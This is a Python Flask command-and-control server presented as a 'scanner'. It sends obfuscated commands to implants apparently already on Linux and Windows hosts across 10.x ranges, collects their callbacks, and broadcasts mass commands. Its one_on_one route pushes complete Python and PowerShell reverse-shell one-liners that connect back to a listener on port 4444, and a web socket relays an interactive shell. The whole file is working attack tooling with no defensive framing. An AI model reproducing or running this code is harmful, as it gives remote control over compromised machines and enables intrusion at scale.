#!/usr/bin/env python3
import sys
import socket
import threading
import time
import logging
from flask import Flask, request, render_template, redirect, url_for
import ipaddress
from flask_socketio import SocketIO, emit

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
socketio = SocketIO(app, async_mode='eventlet')

class Scanner:
    def __init__(self):
        self.linux_ips = []
        self.windows_ips = []
        self.ip_to_os = {}
        self.called_back_linux = set()
        self.called_back_windows = set()
        self.scanner_ip = None
        self.connected_socket = None
        self.lock = threading.Lock()

    def get_devices(self):
        devices = []
        with self.lock:
            for ip in self.called_back_linux:
                devices.append({'ip': ip, 'os': 'linux', 'status': 'Called back'})
            for ip in self.called_back_windows:
                devices.append({'ip': ip, 'os': 'windows', 'status': 'Called back'})
            all_ips = self.linux_ips + self.windows_ips
            for ip in all_ips:
                if ip not in self.called_back_linux and ip not in self.called_back_windows:
                    os_type = self.ip_to_os.get(ip, 'unknown')
                    devices.append({'ip': ip, 'os': os_type, 'status': 'No response'})
        return devices

app.scanner = Scanner()
port = 8080

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    logger.info(f"Client connected: {sid}")
    socketio.start_background_task(stream_shell_output, sid)

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('shell_command')
def handle_shell_command(data):
    cmd = data.get('cmd', '')
    logger.info(f"Received shell command: {cmd}")
    with app.scanner.lock:
        connected_socket = app.scanner.connected_socket
    if connected_socket:
        try:
            connected_socket.send(cmd.encode())
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            emit('shell_output', {'output': f'Error: {e}'})
    else:
        emit('shell_output', {'output': 'No active connection'})

def stream_shell_output(sid):
    while True:
        with app.scanner.lock:
            sock = app.scanner.connected_socket
        if sock:
            try:
                sock.settimeout(0.1)
                data = sock.recv(1024)
                if data:
                    socketio.emit('shell_output', {'output': data.decode('utf-8', errors='ignore')}, to=sid)
                else:
                    # Connection closed
                    socketio.emit('shell_output', {'output': '\r\nConnection closed\r\n'}, to=sid)
                    break
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Error reading from shell: {e}")
                socketio.emit('shell_output', {'output': f'\r\nError: {e}\r\n'}, to=sid)
                break
        else:
            time.sleep(1)

@app.route('/callback')
def callback():
    reported_ip = request.args.get('ip', request.remote_addr)
    with app.scanner.lock:
        os_type = app.scanner.ip_to_os.get(reported_ip, 'unknown')
        if os_type == 'linux':
            app.scanner.called_back_linux.add(reported_ip)
        elif os_type == 'windows':
            app.scanner.called_back_windows.add(reported_ip)
    logger.info(f"Callback from {reported_ip} ({os_type})")
    return "OK"

def parse_ip_range(ip_range_str):
    ips = []
    parts = ip_range_str.split(',')
    for part in parts:
        part = part.strip()
        if not part:
            continue
        try:
            if '-' in part:
                # Has range, e.g., 10.1-13.1.60
                ip_parts = part.split('.')
                if len(ip_parts) != 4:
                    raise ValueError("Invalid IP format")
                for idx, p in enumerate(ip_parts):
                    if '-' in p:
                        start, end = p.split('-')
                        start = int(start)
                        end = int(end)
                        if start > end or start < 0 or end > 255:
                            raise ValueError("Invalid range")
                        for j in range(start, end + 1):
                            new_parts = ip_parts[:]
                            new_parts[idx] = str(j)
                            ip_str = '.'.join(new_parts)
                            ipaddress.ip_address(ip_str)  # validate
                            ips.append(ip_str)
                        break
                else:
                    # No - in any part, treat as single IP
                    ipaddress.ip_address(part)
                    ips.append(part)
            else:
                # Single, assume range 1-13, e.g., 70 -> 10.1.1.70 to 10.13.1.70
                try:
                    int(part)
                    for j in range(1, 14):
                        ip_str = f'10.{j}.1.{part}'
                        ipaddress.ip_address(ip_str)
                        ips.append(ip_str)
                except ValueError:
                    # Treat as full IP
                    ipaddress.ip_address(part)
                    ips.append(part)
        except ValueError as e:
            logger.error(f"Invalid IP or range: {part} - {e}")
            continue
    return ips

def send_linux_command(target_ip, cmd):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        # Encrypt cmd with XOR 0x55
        encrypted = bytes([ord(c) ^ 0x55 for c in cmd])
        data = b"INTLUPD:" + encrypted
        sock.sendto(data, (target_ip, 5555))
        logger.info(f"Sent Linux command to {target_ip}")
        sock.close()
    except Exception as e:
        logger.error(f"Error sending to Linux {target_ip}: {e}")

def send_windows_command(target_ip, cmd):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((target_ip, 443))
        # Base64 encode cmd
        import base64
        encoded = base64.b64encode(cmd.encode()).decode()
        data = b"INTLUPD:" + encoded.encode()
        sock.send(data)
        logger.info(f"Sent Windows command to {target_ip}")
        sock.close()
    except Exception as e:
        logger.error(f"Error sending to Windows {target_ip}: {e}")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    logger.info("Listening on port 4444 for reverse shells")
    while True:
        client, addr = server.accept()
        logger.info(f"Reverse shell connection from {addr}")
        with app.scanner.lock:
            if app.scanner.connected_socket:
                try:
                    app.scanner.connected_socket.close()
                except:
                    pass
            app.scanner.connected_socket = client

@app.route('/')
def index():
    # get private ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        private_ip = s.getsockname()[0]
        s.close()
    except:
        private_ip = "127.0.0.1"
    linux_range = "10.1-13.1.10,20,30,40"
    windows_range = "10.1-13.1.60,70,80"
    return render_template('index.html', private_ip=private_ip, linux_range=linux_range, windows_range=windows_range)

@app.route('/scan', methods=['POST'])
def scan():
    linux_range = request.form['linux_range']
    windows_range = request.form['windows_range']
    scanner_ip = request.form['scanner_ip']
    with app.scanner.lock:
        app.scanner.linux_ips = parse_ip_range(linux_range)
        app.scanner.windows_ips = parse_ip_range(windows_range)
        app.scanner.ip_to_os = {}
        for ip in app.scanner.linux_ips:
            app.scanner.ip_to_os[ip] = 'linux'
        for ip in app.scanner.windows_ips:
            app.scanner.ip_to_os[ip] = 'windows'
        app.scanner.called_back_linux = set()
        app.scanner.called_back_windows = set()
        app.scanner.scanner_ip = scanner_ip
    # send callback commands
    callback_url = f"http://{scanner_ip}:{port}/callback"
    linux_cmd = f"ip=$(ip route get 1 | awk '{{print $7}}'); wget -q -O /dev/null \"{callback_url}?ip=$ip\""
    windows_cmd = f"powershell -c \"Invoke-WebRequest -Uri ('{callback_url}?ip=' + (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{$_.InterfaceAlias -notlike '*Loopback*'}} | Select-Object -First 1).IPAddress) -UseBasicParsing\""
    for ip in app.scanner.linux_ips:
        send_linux_command(ip, linux_cmd)
    for ip in app.scanner.windows_ips:
        send_windows_command(ip, windows_cmd)
    time.sleep(30)  # wait for callbacks
    return redirect(url_for('results'))

@app.route('/results')
def results():
    devices = app.scanner.get_devices()
    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip)

@app.route('/mass_command', methods=['POST'])
def mass_command():
    cmd = request.form['cmd']
    os_type = request.form['os']
    with app.scanner.lock:
        if os_type == 'linux':
            targets = app.scanner.called_back_linux.copy()
            send_func = send_linux_command
        elif os_type == 'windows':
            targets = app.scanner.called_back_windows.copy()
            send_func = send_windows_command
        else:
            message = "Invalid OS"
            devices = app.scanner.get_devices()
            return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
    for ip in targets:
        send_func(ip, cmd)
    message = f"Mass command sent to {len(targets)} {os_type} devices"
    devices = app.scanner.get_devices()
    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)

@app.route('/one_on_one', methods=['POST'])
def one_on_one():
    ip = request.form['ip']
    with app.scanner.lock:
        os_type = app.scanner.ip_to_os.get(ip, 'unknown')
        scanner_ip = app.scanner.scanner_ip
    if os_type == 'linux':
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{scanner_ip}\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
        send_linux_command(ip, cmd)
    elif os_type == 'windows':
        cmd = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{scanner_ip}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        send_windows_command(ip, cmd)
    else:
        message = "Unknown OS for IP"
        devices = app.scanner.get_devices()
        return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)
    message = f"Reverse shell command sent to {ip}. The connection should be established shortly. Use the shell interaction section below to send commands."
    devices = app.scanner.get_devices()
    return render_template('results.html', devices=devices, scanner_ip=app.scanner.scanner_ip, message=message)



if __name__ == "__main__":
    # start listener
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    socketio.run(app, host='0.0.0.0', port=port, debug=False)